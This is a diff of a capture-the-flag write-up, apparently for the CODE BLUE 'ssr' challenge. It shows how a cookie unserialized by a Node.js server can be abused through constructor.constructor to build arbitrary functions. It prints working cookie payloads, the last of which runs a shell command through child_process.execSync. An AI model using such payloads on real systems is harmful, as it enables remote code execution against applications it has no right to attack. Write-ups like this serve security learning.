@@ -1,12 +1,12 @@
 There are some actions of this site:
 
-- login
-- get idol
-- let idol say something
+- Login
+- Get new idol
+- Let idol say something
 
-When get an idol, this site use cookie to store it, such as ``[{"key":["ssr","0"]}]``, will unserialize a ssr idol Uzuki.
+When we get an idol, this site use cookie such as ``[{"key":["ssr","0"]}]`` to store it.
 
-And when access url like http://ssr.tasks.ctf.codeblue.jp/idols/0/say1, will call Uzuki's say1 function.
+And when we access url like http://ssr.tasks.ctf.codeblue.jp/idols/0/say1, this cookie will unserialize as a ssr idol Uzuki then call Uzuki's ``say1`` function.
 
 Try ``[{"key":["a","0"]}]`` will get an error
 
@@ -24,9 +24,7 @@ TypeError: Cannot read property '0' of undefined
     at ReactCompositeComponentWrapper.performInitialMount (/usr/local/ssr/node_modules/react-dom/lib/ReactCompositeComponent.js:359:30)
 ```
 
-Seems server side will also unserialize it.
-
-In this chall, server side and client side share some code, so we can see functions related with generate idol from cookie:
+In this chall, server side and client side share some code, so we can see functions related with idol generating:
 
 ```js
 var unserializeIdols = exports.unserializeIdols = function unserializeIdols(idolsData) {
@@ -71,20 +69,16 @@ var generateIdol = function generateIdol(key) {
 };
 ```
 
-so with such code, when we pass a normal cookie such as ``[{"key":["ssr","0"]}]`` will execute:
+With such code, when we pass a cookie such as ``[{"key":["ssr","0"]}]`` will execute:
 
 ```js
 var idol = _idolDatabase2.default["ssr"]["0"];
 return new idolClass(["ssr","0"]);
 ```
 
-But JavaScript has some magic properties such as prototype/constructor.
+This remind me some magic JavaScript properties such as prototype/constructor will do something i want. When we pass a cookie like:
 
-If we pass a cookie like
-
-```
-[{"key":["constructor","constructor","0%3Breturn 1"]}]
-```
+```[{"key":["constructor","constructor","0%3Breturn 1"]}]```
 
 will execute
 
@@ -99,11 +93,9 @@ and generate a fucntion
 function(){constructor,constructor,0;return '1'}
 ```
 
-now we can generate an arbitrarily function, we can use it by ``call`` method with visit url http://ssr.tasks.ctf.codeblue.jp/idols/0/call.
+Now we can generate an arbitrarily function, we can use this function by ``call`` method with visit url http://ssr.tasks.ctf.codeblue.jp/idols/0/call.
 
-so let's list directory first
-
-try
+so let's list directory first, try
 
 ```
 [{"key":["constructor","constructor","0%3Breturn process.mainModule.require('child_process').execSync('ls /usr/local/ssr/')+''"]}]
